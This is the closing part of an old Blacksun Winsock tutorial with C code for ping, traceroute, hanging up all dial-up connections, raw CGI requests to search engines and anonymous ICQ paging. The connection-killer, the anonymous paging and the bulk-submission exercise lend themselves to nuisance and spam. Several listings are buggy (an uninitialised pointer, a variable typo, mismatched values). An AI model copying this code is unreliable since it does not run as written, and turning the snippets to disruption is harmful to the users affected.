+________________________________________________________________________________________________________
+
+
+9.0 ANOTHER PROTOCOL - ICMP
+=======================================
+
+Yes unfortunately we have to cover yet another one of these protocols, but don't worry this one is cool.
+ICMP stands for the Internet Control Message Protocol and is used for checking for errors on computers connected 
+to the internet. This protocol isnt quite like TCP or UDP it more runs along side IP and kinda runs like a 
+modified version of it. One of the most popular applications on the internet is run on ICMP, it is called Ping.
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+
+     #include <windows.h>
+
+     struct o
+     {
+             unsigned char Ttl,Tos,Flags,OptionsSize,*OptionsData;
+     };
+
+     struct
+     {
+             DWORD Address;
+             unsigned long  Status,RoundTripTime;
+             unsigned short DataSize,Reserved;
+             void *Data;
+             struct o  Options;
+     } 
+      
+     E;
+
+     HANDLE hIP;WSADATA wsa;HANDLE hIcmp;DWORD *dwIPAddr;struct hostent *phostent;
+     DWORD d;char aa[100];struct o I;
+
+     HANDLE       ( WINAPI *pIcmpCreateFile )( VOID );
+     BOOL       ( WINAPI *pIcmpCloseHandle )( HANDLE );
+     DWORD       (WINAPI *pIcmpSendEcho)(HANDLE,DWORD,LPVOID,WORD,LPVOID,LPVOID,DWORD,DWORD);
+
+     int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCmd,int nShow )
+     {
+             hIcmp = LoadLibrary( "ICMP.DLL" );
+             WSAStartup( 0x0101, &wsa );
+             phostent = gethostbyname( "www.microsoft.com");
+             dwIPAddr = (DWORD *)( *phostent->h_addr_list );
+             pIcmpCreateFile=GetProcAddress( hIcmp,"IcmpCreateFile");
+             pIcmpCloseHandle=GetProcAddress( hIcmp,"IcmpCloseHandle");
+             pIcmpSendEcho =GetProcAddress( hIcmp,"IcmpSendEcho" );
+             hIP = pIcmpCreateFile();
+             I.Ttl=6;
+
+             pIcmpSendEcho(hIP,*dwIPAddr,0,0,&I,&E,sizeof(E),8000 );
+             d=E.Address;
+             phostent = gethostbyaddr((char *)&d,4,PF_INET);
+             sprintf(aa,"gethostbyaddr %p",phostent );
+             MessageBox(0,aa,aa,0);
+             if ( phostent  != 0 )
+                     MessageBox(0,phostent->h_name,"hi",0);
+             wsprintf(aa,"RTT: %dms,TTL:%d", E.RoundTripTime,E.Options.Ttl );
+             MessageBox(0,aa,"hi",0);
+             pIcmpCloseHandle( hIP );
+             FreeLibrary( hIcmp );
+             WSACleanup();
+     }
+
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+First off this ain't my own code, I downloaded this code off a website and if you think the coding style
+is kinda messy, well I agree with you (bear in mind I have already cleaned it up a bit).
+
+Unfortunately I couldn't compile and run this code on my computer :( , judging from the fact that almost
+evry ping and ICMP program on the internet that relies on the ICMP dll looks like this one im guessing it
+has something to do with my compiler or my version of windblows.
+
+Anyway the program specifies some information at the start, like the ttl (time to live) and so on, which
+it will use later and we build a structure. We then state some usual winsock variables and skip onto the 
+WinMain function.
+
+We load the ICMP library directly because microsoft din't release a .lib file for the bloody thing :).
+We then call phostent and pass the host name www.microsoft.com to the gethostbyname() function.
+
+This is closely followed by initialising 3 pointers to functions to the address's of related functions.
+
+1. pIcmpCreateFile      -  IcmpCreateFile
+2. pIcmpCloseHandle      -  IcmpCloseHandle
+3. pIcmpSendEcho      	-  IcmpSendEcho
+
+
+We then pass a handle to hIP and set the ttl to 60. The structure I contains fields of the IP header, which
+we are able to alter.
+
+The main function is pIcmpSendEcho (unless ya want to count WinMain), it has 8 parameters.
+
+
+1. hIP      	-  Handle from IcmpCreateFile().
+2. dwIPAddr      	-  Destination IP address.
+3. 0      	      -  Pointer to buffer to send.
+4. 0      	      -  Size of buffer in bytes.
+5. &I      	      -  Request options.
+6. &E      	      -  Reply buffer.
+7. sizeof(E)      -  The size of the reply buffer.
+8. 8000      	-  Time to wait in milliseconds.
+
+
+We then print information about the ping like round trip time and the ttl of the return packet.
+We finish by unloading the icmp dll and WSACleanup() after us.
+
+Another application of ICMP is called tracetoute.
+In traceroute we ping a host but we start off with the ttl = 1. This ICMP packet gets to the first router
+and is decremented. The ttl is then 0 and the router sends back an error message telling us that it dropped
+our packet. 
+
+We then send a packet with the ttl = 2 and it is dropped by the second router and again an error message is
+returned. We keep on sending the ping putting the ttl up by one each time until we reach the host we are
+pinging. By saving the IP address's and host names contained in the error messages from the routers we can
+view the route the packet takes from us to the host we are tracing. This is traceroute.
+
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+     #include <stdio.h>
+     void abc(char *p)
+     { 
+      	FILE *fp=fopen("z.txt","a+");
+            fprintf(fp,"%s\n",p);
+           	fclose(fp);
+     }
+     struct o
+     {
+     unsigned char Ttl;unsigned char a[7];
+     };
+     struct
+     {
+     DWORD Address;
+     unsigned long  Status,RoundTripTime;
+     unsigned char a[8];
+     struct o  Options;
+     } E;
+
+     HANDLE hIP;WSADATA wsa;HANDLE hIcmp;DWORD *dwIPAddr;struct hostent *phostent;
+     DWORD d;char aa[100];struct o I;char bb[100];int z;
+
+     HANDLE ( WINAPI *pIcmpCreateFile )( VOID );
+     BOOL ( WINAPI *pIcmpCloseHandle )( HANDLE );
+     DWORD (WINAPI *pIcmpSendEcho) (HANDLE,DWORD,LPVOID,WORD, LPVOID,       LPVOID,DWORD,DWORD);
+
+     int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrev,
+                                             LPSTR lpCmd,int nShow )
+     {
+     hIcmp = LoadLibrary( "ICMP.DLL" );
+     WSAStartup( 0x0101, &wsa );
+     pIcmpCreateFile=GetProcAddress( hIcmp,"IcmpCreateFile");
+     pIcmpCloseHandle=GetProcAddress( hIcmp,"IcmpCloseHandle");
+     pIcmpSendEcho =GetProcAddress( hIcmp,"IcmpSendEcho" );
+     hIP = pIcmpCreateFile();
+
+     for ( z = 1; z<= 20 ; z++)
+     {
+            I.Ttl=(unsigned char)z;
+           	phostent = gethostbyname( "www.neca.com");
+            dwIPAddr = (DWORD *)( *phostent->h_addr_list );
+            pIcmpSendEcho(hIP,*dwIPAddr,0,0,&I,&E,sizeof(E),8000 );
+            d=E.Address;
+           	phostent = gethostbyaddr((char *)&d,4,PF_INET);
+            if ( phostent != 0)
+                   strcpy(aa,phostent->h_name)  ;
+            else
+                   strcpy(aa,"no host name");
+           wsprintf(bb," RTT: %dms,  TTL:      %d", E.RoundTripTime,       E.Options.Ttl );
+           strcat(aa,bb);
+           abc(aa);
+           if ( E.Options.Ttl )
+             break;
+     }
+     MessageBox(0,"over","hi",0);
+     pIcmpCloseHandle( hIP );
+     FreeLibrary( hIcmp );
+     WSACleanup();
+     }
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+So this is traceroute (very useful for discovering network trust issues and for diagnostics).
+
+
+
+[ Excercises ]
+
+Create a program which pings a host multiple times in any way you want, then compare the
+different routes.
+
+________________________________________________________________________________________________________
+
+
+10.0 OTHER INTERNET CODE
+=======================================
+
+Some times you need more than just the common winsock programming so I decided to add this section,
+its a bit off the mark of the tutorial but still it might come in handy.
+
+
+10.1 INTERNET CONNECTIONS
+=======================================
+
+The first program were going to look at is Hangup.cpp which was programmed by senna spy, all of his
+original comments are included and no code is altered so im just going to give you the code as it
+appears in the file which is available to download from the net.
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+/////
+//
+// Copyright (C), April, 06 - 2000, By Senna Spy - ICQ UIN:  3973927
+//
+//    Senna Spy Programmer Official WebSite:
+//
+//       http://sennaspy.cjb.net
+//       http://w3.to/sennaspy
+//       http://sennaspy.tsx.org
+//       http://www.sennaspy.hpg.com.br
+//
+// HangUpConnections() 
+//
+//    Close All Internet Connections
+//
+/////
+
+#include <ras.h> 
+   
+#define  MAX_CONNECTIONS  128
+
+//////////////////////////////////
+//                              //
+// HangUpConnections() Function //
+//                              //
+//////////////////////////////////
+
+void HangUpConnections()
+{ 
+    // Variables
+    RASCONN rcConnection[ MAX_CONNECTIONS ];  
+
+    DWORD dwBufferSize;
+    DWORD dwTotalConnections;
+
+    int nLoop;
+
+    // Set Buffer Size
+    rcConnection[0].dwSize = sizeof( RASCONN );  
+    dwBufferSize = MAX_CONNECTIONS * sizeof( RASCONN );
+
+    // I can Enumerate Connections ?
+    if( RasEnumConnections( rcConnection, &swBufferSize, &dwTotalConnections ) )
+        return;
+
+    // There is Connections ?
+    if( dwTotalConnections )
+    {
+        // Looking All Conections
+        for( nLoop = 0; nLoop < (int) dwTotalConnections; nLoop ++) 
+        { 
+             // Check Status
+             RASCONNSTATUS rcsStatus;
+             rcsStatus.dwSize = sizeof( RASCONNSTATUS );
+
+             // Don't OK ?
+             if( RasGetConnectStatus( rcConnection[ nLoop ].hrasconn, &rcsStatus ) )
+                 break;
+
+             // Is Connected ?
+             if( rcsStatus.rasconnstate == RASCS_Connected )
+             {
+                 // Close Connection...
+                 if( RasHangUp( rcConnection[ nLoop ].hrasconn ) )
+                     break;
+             }
+        }
+    }
+} 
+
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+This program includes the ras.h header file, which is in charge of internet connections and has to
+be included to interact with connections.
+
+The main function is HangUpConnections() and all the code takes place here.
+
+First we set the buffer size that will be used and then we check if we can enumerate internet connections.
+If there are internet connections present we loop trough them and check if were connected.
+If it turns out that there is a connection present we then close it.
+
+
+Heres some more code utilizing ras.h and again no this one isn't by me either.
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+////
+//
+// Check for Internet Connection
+//
+// Windows 95, 98 and NT Compatible
+// Proxy (Client) Not Compatible
+//
+// Copyright (C), 14/02/2000, By Marcos Velasco
+//
+// http://icqpassword.cjb.net
+//
+/////
+
+#include <ras.h>
+
+
+bool IsConnected()
+{
+   LPRASCONN TRasCon;
+   RASCONNSTATUS Tstatus;
+
+   DWORD lg;
+   DWORD lpcon;
+   bool lReturn;
+
+   TRasCon->dwSize = 412;
+   lg = 256 * TRasCon->dwSize;
+   lReturn = false;
+
+   if( RasEnumConnections(TRasCon, &lg, &lpcon) == 0 )
+   {
+       Tstatus.dwSize = 160;
+       RasGetConnectStatus(TRasCon->hrasconn, &Tstatus);
+
+       lReturn = ( Tstatus.rasconnstate == 0x2000 );
+   }
+
+   return( lReturn );
+}
+
+
+
+// Example:
+
+   if( IsConnected() )
+       // It's OK.... Connected.. :-)
+   else
+       // Not Connected.. :-(
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+Like the previous code this one I downloaded from the net and has not been altered by me in any way.
+
+This code is quiet similiar to the last one and it leaves you room to add code to deal with the connection,
+this piece kind of reminds me of the port scanner earlier, it checks whether the connection is present first,
+like the scanner checked if the port was busy and then leaves you open to add messages to the user.
+
+
+________________________________________________________________________________________________________
+
+
+
+10.2 CGI Programming
+=======================================
+
+CGI stands for the Comon Gateway Interface. On web sites we can have programs that provide a service to users.
+These programs can be anything from guest books and chat rooms to search engines and e-mail programs, such as
+hotmail.com's web interface or the Alta Vista search engine.
+
+These programs can be written in any language you want, c++, perl, vb and any others, but how does the user
+communicate with the program? Websites tend to use forms to collect the information on say for example, a
+guestbook.
+
+But how does the information get from the form to the program? This is when cgi is used.
+In the following example we are going to register a website with the webcrawler search engine.
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+
+
+WSADATA  wsdata;
+SOCKET   sock;      
+DWORD    wsock;      
+
+struct   sockaddr_in Sa;
+long       cnnct;      
+char       output[100];
+char       msge[1000],str[10000]; 
+int       i;
+struct       hostent *h;
+
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+      if (message == WM_LBUTTONDOWN)
+      {
+
+      wsock = WSAStartup(0x0101,&wsdata);
+
+      sprintf(output,"WSAStartup..wsock = %ld..wsdata=%p",wsock,wsdata);
+
+      MessageBox(0,output,"Winsock",0);
+
+      sock = socket(AF_INET,SOCK_STREAM,0);
+
+      sprintf(output,"Socket = %ld..",sock);
+
+      MessageBox(0,output,"Socket",0);
+
+      h = gethostbyname("info.webcrawler.com");
+
+      Sa.sin_family = AF_INET;
+      Sa.sin_port = htons(80);
+      Sa.sin_addr.s_addr=*((unsigned long *) h->h_addr);
+
+      cnnct = connect(sock,(struct sockaddr *)&Sa,sizeof(Sa));
+
+      sprintf(output,"Connect = %ld",cnnct);
+      
+      MessageBox(0,output,"Connect",0);
+
+      strcpy(msge,"POST  /cgi-bin/addURL.cgi HTTP/1.0\r\n");
+      strcat(msge,"Content-type: application/x-www-form-urlencoded\r\n");
+      strcat(msge,"Content-length: 41\r\n");
+      strcat(msge,"\r\n");
+      strcat(msge,"URLS=http://blacksun.box.sk");
+
+      MessageBox(0,msge,"Sent",0);
+
+      cnnct = send(sock,msge,strlen(msge),0);
+
+      sprintf(output,"Send Post=%ld",cnnct);
+         
+      MessageBox(0,output,"Send Post",0);
+
+      i = 1;
+
+      while(i !=0)
+      {
+      	i = recv(sock,str,sizeof(str),0);
+
+      	sprintf(output,"i = %d",i);
+      	MessageBox(0,output,"Update",0);
+      }
+
+      MessageBox(0,"Code Complete","Ending...",0);
+          
+}
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+This program is very familiar at this point. A search engine requires a certain amount of 
+information before adding a site to its list to search. In the program we copy this information
+to msge and send this to the server trough the post method. In this program we add blacksun.box.sk
+to the list of sites to search, replace that site in the program with the address you want.
+
+
+Of course what else do we do with search engines?
+
+The following program search's for "blacksun security" on the yahoo search engine.
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+
+
+void outtie(char *p)
+{
+      FILE *fp=fopen("SearchLog.txt","a+");
+      fprintf(fp,"%s\n",p);
+      fclose(fp);
+}
+     
+
+
+WSADATA  wsdata;
+SOCKET   sock;      
+DWORD    wsock;      
+
+struct   sockaddr_in Sa;
+long       cnnct;      
+char       output[100];
+char       msge[1000],str[10000]; 
+int       i;
+struct       hostent *h;
+char       Headers[]="HTTP/1.0\r\n""User-Agent:AuthClient\r\n""Accept:*/*\r\n";
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,          	// Windows Class Name
+      	      	 "Interface",           // Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,  	// Windows Style
+      	      	 CW_USEDEFAULT,         // initial x position
+      	      	 CW_USEDEFAULT,         // initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+      if (message == WM_LBUTTONDOWN)
+      {
+
+      wsock = WSAStartup(0x0101,&wsdata);
+
+      sprintf(output,"WSAStartup..wsock = %ld..wsdata=%p",wsock,wsdata);
+
+      MessageBox(0,output,"Winsock",0);
+
+      sock = socket(AF_INET,SOCK_STREAM,0);
+
+      sprintf(output,"Socket = %ld..",sock);
+
+      MessageBox(0,output,"Socket",0);
+
+      h = gethostbyname("search.yahoo.com");
+
+      Sa.sin_family = AF_INET;
+      Sa.sin_port = htons(80);
+      Sa.sin_addr.s_addr=*((unsigned long *) h->h_addr);
+
+      cnnct = connect(sock,(struct sockaddr *)&Sa,sizeof(Sa));
+
+      sprintf(output,"Connect = %ld",cnnct);
+      
+      MessageBox(0,output,"Connect",0);
+
+
+          strcpy(msge,"GET");
+      strcat(msge," ");
+          strcat(msge,"/bin/search?p=blacksun+security&b=1");
+          strcat(msge," ");
+      strcat(msge,Headers);
+      strcat(msge,"\r\n");
+
+      MessageBox(0,msge,"Sent",0);
+
+      cnnct = send(sock,msge,strlen(msge),0);
+
+      sprintf(output,"Send Post=%ld",cnnct);
+         
+      MessageBox(0,output,"Send Post",0);
+
+      i = 1;
+
+      while(i !=0)
+      {
+
+      memset(&str,'\0',10000);    
+      i = recv(sock,str,sizeof(str),0);
+
+      outtie(str);
+      sprintf(output,"i = %d",i);
+
+      MessageBox(0,output,"Update",0);
+
+      }
+
+      MessageBox(0,"Code Complete","Ending...",0);
+          
+}
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+How else can we use this method? Using this we can submit information to any cgi form on a
+website. Icq.com provides paging, where we can page icq members.
+
+Im not sure who wrote the following code as its not contained in the comments and I cant remember who
+I got it from so if you know could you let me know? (I have a feeling that its senna spy).
+
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+
+///////////////////////////////////////////////////////////////////////
+//                                                                   //
+// PagerICQ - Send Messages to ICQ Pager                             //
+//                                                                   //
+//    Visual C++, Borland C++ and C++ Builder Compatible Source Code //
+//    Windows 9x, NT and 2000 Compatible                             //
+//                                                                   //
+// Function:                                                         //
+//                                                                   //
+//    ICQPager( cUIN, cMessage )                                     //
+//                                                                   //
+//       Parameters:                                                 //
+//                                                                   //
+//          cUIN     = ICQ UIN Number                                //
+//          cMessage = Message To Send                               //
+//                                                                   //
+///////////////////////////////////////////////////////////////////////
+
+#include "winsock.h"
+
+
+
+bool ICQPager( char * cUIN, char * cMessage )
+{
+   // Variables
+   struct sockaddr_in ICQServer;
+
+   WORD wVersionRequested;
+   WSADATA wsaData;
+
+   char      cEOL[] = { 13, 10, 0 };
+   char cMsg[ 512 ] = "";
+
+   bool lOK = false;
+
+   int nLoop;
+
+   // Remove Invalid Characters
+   // and... Change spaces to "+"
+   for( nLoop = 0; nLoop < strlen( cMessage ); nLoop ++ )
+   {
+        if( cMessage[ nLoop ] <  33 || 
+            cMessage[ nLoop ] > 126 || 
+            cMessage[ nLoop ] == '&' )
+        {
+            cMessage[ nLoop ] = '+';
+        }
+   }
+
+   // Start Winsock
+   wVersionRequested = MAKEWORD( 1, 0 );
+
+   if( WSAStartup( wVersionRequested, &wsaData ) == 0 )
+   {
+       // Make Socket
+       ICQServer.sin_family      = AF_INET;
+       ICQServer.sin_port        = htons( 80 );
+       ICQServer.sin_addr.s_addr = inet_addr( "205.188.147.55" ); //wwp.icq.com
+
+       int ICQSock = socket( AF_INET, SOCK_STREAM, 0 );
+
+       // Connect Server
+       if( connect( ICQSock, (struct sockaddr *) &ICQServer, sizeof( ICQServer ) ) == 0 )
+       {
+           // Make Message
+           strcpy( cMsg, "GET /scripts/WWPMsg.dll?from=anonymous&fromemail=mail@test.com&subject=pager" );
+           strcat( cMsg, "&body=" );
+           strcat( cMsg, cMessage );
+           strcat( cMsg, "&to=" );
+           strcat( cMsg, cUIN );
+           strcat( cMsg, " HTTP/1.0" );
+           strcat( cMsg, cEOL );
+           strcat( cMsg, cEOL );
+           strcat( cMsg, cEOL );
+
+           // Send Message
+           lOK = ( send( ICQSock, cMsg, strlen( cMsg ), 0 ) >= 0 );
+
+           // Reveive
+           if( lOK )
+               recv( ICQSock, cMsg, 512, 0 );
+
+           // Close Socket
+           closesocket( ICQSock );
+       }
+
+       // Close Winsock
+       WSACleanup();
+   }
+
+   // Return
+   return ( lOK );
+}
+
+
+////////////////////////
+//                    //
+// Example of the use //
+//                    //
+////////////////////////
+
+void Example()
+{
+    char * cMessage = "Message test send to ICQ Pager";
+
+    if( ICQPager( "3973927", cMessage ) )
+        // OK
+    else
+        // Error
+}
+
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+Again we copy the text to be sent to the server into cMsg and send it to the server. The main 
+difference with this program is that some cgi programs dont allow certain characters like "/"
+for example. In the program we loop trough the message and remove all of the illegal characters
+and while were at it we also replace all of the spaces " " with plus's "+"'s, another requirment
+of the cgi script.
+
+The formatted message is then sent to the server.
+
+[ EXCERCISES]
+
+Write a program that loads sites from a file and adds them to the webcrawler search engine.
+
+
+________________________________________________________________________________________________________
+
+
+
+11.0 LAST WORDS
+=======================================
+
+Well thats it for this tutorial, or at least this part of it. More parts are planned so hopefully you
+should see them on blacksun soon :). This part covered the basics of windows programming, there was
+no point in writing about unix programming as bracaman has released a very good tutorial on basic unix
+sockets programming which is available from blacksun.box.sk and code.box.sk.
+
+I will be discussing Unix sockets again however in the next part of this tutorial but mostly in a porting
+sense. To see whats planned for future parts so far just look down :).
+
+
+Part 2. -  GENERAL SOCKETS - Porting to windows and cross platform code.
+Part 3. -  RAW Sockets     - Have more control over packets with raw sockets.
+Part 4. -  ADVANCED        - A real world example by building an internet communication suite.
+Part 5. -  FINISHING OFF   - Putting it all together in one big program.
+
+So thats whats still to come, but I may change some of these future tutorials at any time before there released
+if I do so it will be to improve the series.
+
+The following Appendix's contain some information that hopefully will be of use to you.
+
+Well thank you for reading this tutorial and visit my website to keep up to date with the series and for
+add on code and articles to the series.
+
+- BR ;)
+
+
+________________________________________________________________________________________________________
+
+
+QUESTIONS AND ANSWERS
+=======================================
+
+This section doesn't just describe Socket programming but has 1 or 2 questions on internet enabling an
+application also.
+
+==============================================================================
+
+Q. How do I open a web page up in Internet Explorer/Netscape Navigator?
+
+A. You can open up a url in the default web browser by using shell execute.
+
+#include <shellapi.h>
+#include <shlobj.h>
+
+ShellExecute(Handle,"open","http://www.company.com", //Put your website address here
+              NULL,NULL,SW_SHOWDEFAULT);
+
+
+If you replace ftp://ftp.company.com it will open an ftp site and replacing with
+mailto:email@company.com will provide you with e-mail support.
+
+==============================================================================
+
+Q. How do I periodically download files?
+
+A. You can either use WinInet's API to do so or use WinSock, like HTTP's GET method.
+
+==============================================================================
+
+Q. How do I make a Web Browser.
+
+A. A web browser would require alot of work, beyond just downloading the files but parsing them formatting,
+   Displaying the results, incorporating FTP and CGI support for downloading and for using forms.
+   Calling default Mail Client, Supporting standards and scripts like html javascript xml css vbscript and 
+   others and then keeping up to date with new versions of these standards and dont even get me started on
+   security issues and e-commerce transaction!!!
+
+   or you can use the MS Internet Explorer Active-X control which once you understand it you can use it as
+   easily as adding a richedit or listbox to a program.
+
+   NOTE. For educational institutes you can also download the source code for NCSA mosaic or you can also
+   download the source for Mozilla.
+
+==============================================================================
+
+Q. How do I get more control over IP Packets?
+
+A. You can use RAW sockets, a method we will be discussing more in Part 3 of this tutorial.
+
+==============================================================================
+
+
+==============================================================================
+
+Q. Why am I getting all of these linker errors when I try and compile the program?
+
+A. You have to be sure and add Wsock32.lib to the link list in your compiler settings.
+   (for every program!)
+
+==============================================================================
+
+If you have any questions that you'd like to see here or want answered then e-mail me at cos125@hotmail.com
+
+________________________________________________________________________________________________________
+
+
+APPENDIX A - THE COMPILER
+=======================================
+
+All of the programs in this tutorial have been tested under Microsoft Visual C++ 6.0 and im running
+Windows 2000 Professional edition and I have a Intel Pentium 2.
+
+To set up compiler for winsock programming you need to link Wsock32.lib to your project. Under Visual C++
+do the following.
+
+1. Select the File view tab.
+2. Right Click the files menu and goto Settings.
+3. Select the Link tab in Project Settings.
+4. Add Wsock32.lib to the list of .lib files and press ok.
+
+The winsock.h header file is included in windows.h so dont worry about that :).
+
+
+________________________________________________________________________________________________________
+
+
+
+APPENDIX B - IP AND PORT NUMBERS
+=======================================
+
+Both TCP and UDP rely upon IP in order to get where they are going, UDP just does it faster and TCP is 
+just more reliable at it. The main similarity is there addressing scheme. Both protocols use IP address's 
+and port numbers to get where they are going.
+
+An IP number or "internet address" is provided to every computer connected to a network such as the internet. 
+It takes a form of 4 decimal numbers, each one 8 bits (or one octet) in length. 
+
+The word octet is used instead of 1 byte because TCP is implamented on many computers that contain more 
+than 8 bits in a byte. The address looks like this 127.0.0.1 and is used to describe which computer on 
+which network it is. The number 128.6 is the address of a network provided by a central authority.  
+128.6.4 would be a sub network of the previous, and 194 would be the target computers number within that 
+network.
+
+
+1. 128.6        -  A network
+2. 128.6.4      -  A sub network
+3. 128.6.4.194  -  Computer within the sub network
+
+
+Imagine a computer on the net that was running an FTP server (FTP is a protocol used to transfer files 
+across the internet from 1 computer to another (the File Transfer Protocol)) and also wanted to run 
+several other servers, such as a Time Server (Time is a protocol developed to allow remote computers to 
+view the local time on a host) and a http server(a web server which is what sends you web pages such as 
+the tutorials page of http://blacksun.box.sk).
+
+Well if some-1 was to request a file from the ftp server then how would the computer know that the request 
+was for the ftp server and not the time or http server? 
+
+For this reason each server runs on a specific port. A server connects itself to a default port, 21 for 
+FTP, 13 for Time and 80 for HTTP. When the request for the file is sent in a packet the computer looks at 
+the TCP or UDP header. A field in these headers is called the port field and contains the number of the 
+server that is wants to talk to. So an FTP's TCP header for example would contain a number of 21 in the 
+port field.
+
+Ports are simply a way of differentiating between what server gets what messages.
+
+These two requirments (The IP address and Port number) are just the parts of the computers over all address, 
+like the different parts of a mail address, ie; Street Address, City, State/Province, Postal Code, Country.
+
+
+________________________________________________________________________________________________________
+
+
+
+APPENDIX C - SERVERS AND CLIENTS
+=======================================
+
+The names servers and clients are given to two different kinds of computer on the internet. If you were
+viewing a web page on the internet with internet explorer or netscape navigator you would be reffered
+to as a client and the computer which stores the web page your looking at is reffered to as the server.
+
+A server is any computer connected to a network which is running a program that provides a service to others.
+A client is a computer that connects to this computer and avails of this service.
+
+Each one is just different ends of a connection and these names are also used to describe the programs that
+provide or avail of these services.
+
+The apache http server is a program that provides a service and is known as a web server.
+Internet Explorer
+
+
+________________________________________________________________________________________________________
+
+
+
+APPENDIX D - ROUTERS AND GATEWAYS
+=======================================
+
+Routers and gateways are both basically the same thing. If you wanted to you could say that all computers
+connected to the internet can fall under 2 categories, the first being servers and clients and the second
+being routers and gateways.
+
+Servers and clients provide ends of a connection but in order for information to travel from one computer
+to another on the internet it must pass trough other networks, hence the phrase internet or interconnected
+networks.
+
+A router or gateway has a connection to more than one network so that it can pass information between one
+network and another. Information that passes from my computer in ireland thats going to a computer in like
+California or Delhi will pass trough several routers or gateways between the two computers. The purpose of
+these computers is only to pass the information from one to the other to get the info where its going to in
+as fast a time as possible.
+
+
+
+
+              __
+             /  \
+            |    |   - SERVER
+             \__/
+
+            |
+            |
+            |
+             \
+              \
+               \
+                \
+                 \
+                   __
+                  /  \
+                 |    |   - ROUTER/GATEWAY
+                  \__/
+                /   
+               /    
+              /
+             /
+            /
+            |      
+            |
+            |
+            __
+           /  \
+          |    |   - ROUTER/GATEWAY
+           \__/
+
+            |
+            |
+            |
+            |
+            |
+             \__
+             /  \
+            |    |   - CLIENT
+             \__/
+
+
+      
+
+      FIG 6. - Packets traveling from a client to server trough routers/gateways.
+
+
+________________________________________________________________________________________________________
+
+
+
+APPENDIX E - FURTHER READING
+=======================================
+
+[ TUTORIALS ]
+
+There is a large amount of tutorials available from blacksun.box.sk and from code.box.sk.
+I suggest that you read any of these pertaining to programming and networking.
+
+Some of these Programs and sections are linked with other BSRF tutorials.
+
+=========================================================================================================
+
+Sections 2.4 to 3.2 dealt with the basics of Sockets programming and was mostly inspired by bracamans
+tutorial "BASIC C Socket Programming In Unix For Newbies" available from blacksun.box.sk and code.box.sk.
+
